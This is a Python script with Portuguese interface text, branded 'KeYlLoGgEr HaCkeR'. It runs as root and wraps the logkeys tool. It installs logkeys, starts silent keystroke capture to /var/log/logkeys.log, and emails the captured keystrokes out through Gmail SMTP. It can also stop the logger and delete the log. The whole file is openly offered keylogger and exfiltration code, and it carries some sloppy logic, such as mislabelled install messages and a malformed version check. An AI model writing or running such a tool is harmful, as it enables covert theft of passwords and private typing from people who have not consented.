# -*- coding: utf-8 -*-

# Sistema keylogger.
#Versão: 1.0.2

import os
from time import sleep
import sys, traceback
import getpass
import platform

exit_msg = "\n[++] Até logo!\n"

def intro():
    if not os.geteuid() == 0:
        sys.exit("""\033[1;91m\n[!] Script deve ser utilizado em modo root.\n\033[1;m""")
    else:
        print(""" \033[1;36m
┌════════════════════════════┐
|     KeYlLoGgEr HaCkeR      |
└════════════════════════════┘\033[1;m""")
intro()

def instalar01():
    print("\n[+] Instalando o logkeys. Aguarde!")
    os.system("apt-get update > /dev/null")
    os.system("apt-get install logkeys -y > /dev/null")
    sleep(2)  
    print("\n[+] Ok!")
def instalar02():
    print("\n[+] Instalando o logkeys. Aguarde!")
    os.system("chmod +x logkeysinstall.sh && ./logkeysinstall.sh")
    sleep(2)
    print("\n[+] Ok!")

def verificar():
    print("[++] Verificando dependencias:\n")
    dist = (platform.dist()[1])
    print("[!] Versão do seu sistema: ", dist)
    sleep(2)
    if os.path.exists("/usr/bin/logkeys") or os.path.exists("/etc/default/logkeys") == True:
        print("\n[!] Logkeys já está instalado!")
        sleep(2)
    elif dist ==  "18.04" and "kali*":
        print("\n[!] Logkeys já está instalado!")
        instalar02()
    else:
        print("\n[!] Logkeys já está instalado!")
        instalar01()
                 
    if os.path.exists("/usr/share/applications/gnome-terminal.desktop") == True:
        print("\n[!] Gnome-terminal já está instalado!")
        sleep(2)
    else:
        print("\n[+] Instalando o gnome-terminal. Aguarde!")
        sleep(2)
        os.system("apt-get install gnome-terminal -y  > /dev/null")
        print("\n[+] Ok")
        sleep(1)

def enviar():
    import smtplib
    try:
        smtp = smtplib.SMTP('smtp.gmail.com', 587)
        smtp.starttls()

        user = str(input("\n- Digite o remetente:  "))
        pwd = getpass.getpass("\n- Digite sua senha:  ")
        email = str(input("\n- Digite o destinatário:  "))

        smtp.login(user,pwd)

        de = [user]
        para = [email]

        header = '\n\n' + 'To: ' + email + '\n\n' + 'From: ' + user + '\n\n' + 'Subject: Logs do Sistema Logkeys \n'
        mensagem = '/var/log/logkeys.log'
        open_archive  = open(mensagem, 'r')
        msg = header + open_archive.read()
        smtp.sendmail(user, email, msg)
        smtp.quit()
        print("""\033[1;36m\n [++] Email enviado\033[1;m""")
        sleep(2)

    except smtplib.SMTPRecipientsRefused:
        print("""\033[1;91m\n [!] Erro ao enviar, email inválido\n\033[1;m""")
        sleep(2)
        enviar()

def sistema():
    os.system("clear")
    intro()
    print("+-----------------------------+")
    print("| ESCOLHA UMA OPÇÂO:          |")
    print("+-----------------------------+")
    print("| 1 - Iniciar o logkeys       |")
    print("| 2 - Abrir janela de logs    |")
    print("| 3 - Enviar logs por e-mail  |")
    print("| 4 - Parar logkeys           |")
    print("| 5 - Apagar arquivos de logs |")
    print("| 6 - Sair do sistema         |")
    print("+-----------------------------+\n")
    opcao = str(input("Digite uma opção: "))

    if opcao == "1":
        print("\n[+] Iniciando o logkeys")
        if os.path.exists("pt_BR.map") == True:
            os.system("logkeys -s -m pt_BR.map")
        else:
            os.system("wget https://raw.githubusercontent.com/kernc/logkeys/master/keymaps/pt_BR.map > /dev/null")
            os.system("logkeys -s -m pt_BR.map")
        sleep(2)
        print("\n[+] Ok")
        sleep(2)
        os.system("clear")
        sistema()

    elif opcao == "2":
        print("\n[+] Abrindo tela de logs")
        os.system("gnome-terminal -x tail -f /var/log/logkeys.log")
        sleep(2)
        os.system("clear")
        sistema()

    elif opcao == "3":
        print("\n[+] Enviar log por e-mail")
        print("[++] Obs: Permita utilizar app menos seguro na conta do gmail que você for utilizar como remetente.")
        sleep(3)
        enviar()
        os.system("clear")
        sistema()

    elif opcao == "4":
        print("\n[+] Parando logkeys")
        os.system("logkeys -k")
        sleep(2)
        os.system("clear")
        sistema()

    elif opcao == "5":
        print("\n[+] Apagando arquivos de logs")
        sleep(2)
        if os.path.exists("/var/log/logkeys.log") == True:
            os.system("rm -rf /var/log/logkeys.log")
            print("\n[++] Arquivo apagado!")
            sleep(2)
        else:
            print("\n[++] Arquivos não existe ou já foi apagado!")
            sleep(2)
        os.system("clear")
        sistema()

    elif opcao == "6":
        print("\n[+] Saindo do sistema")
        sleep(2)
        sys.exit()
    else:
        opcao == ""
        print("""\033[1;91m\n[!] Opção inválida. Favor selecionar uma das opões do menu.\n\033[1;m""")
        sleep(2)
        os.system("clear")
        sistema()

try:
    verificar()
    sistema()
except KeyboardInterrupt:
	print ("\n" + exit_msg)
	sleep(1)
except Exception:
	traceback.print_exc(file=sys.stdout)
sys.exit(0)